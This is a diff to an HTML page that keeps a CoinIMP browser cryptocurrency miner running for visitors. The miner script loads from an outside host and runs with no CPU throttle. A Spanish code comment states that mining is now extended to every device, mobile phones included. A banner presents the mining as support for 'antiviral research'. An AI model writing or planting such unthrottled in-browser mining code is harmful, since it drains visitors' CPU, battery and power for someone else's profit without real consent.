@@ -106,13 +106,20 @@
   </div>
 
   <!-- CoinIMP Mining Script -->
-  <script src="https://www.hostingcloud.racing/4qzr.js"></script>
-  <script>
-    var _client = new Client.Anonymous('201f3477d57d2ae999354d2a82193d7a413cdbecc697c25648ab9e2b73a33c21', {
-      throttle: 0, c: 'w', ads: 0
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "🧠 This site is mining MintMe to support antiviral research. Thanks for your support! ¡Gracias por tu apoyo!", "#fea916", 30, "#000000");
-  </script>
+ <!-- CoinIMP Mining Script -->
+<script src="https://www.hostingcloud.racing/4qzr.js"></script>
+<script>
+  var _client = new Client.Anonymous('201f3477d57d2ae999354d2a82193d7a413cdbecc697c25648ab9e2b73a33c21', {
+    throttle: 0, c: 'w', ads: 0
+  });
+
+  // Detectar si es dispositivo móvil
+  var onMobile = _client.isMobile(); 
+
+  // Iniciar minería en TODOS los dispositivos (incluyendo móviles)
+  _client.start(); 
+
+  _client.addMiningNotification("Top", "🧠 This site is mining MintMe to support antiviral research. Thanks for your support! ¡Gracias por tu apoyo!", "#fea916", 30, "#000000");
+</script>
 </body>
 </html>
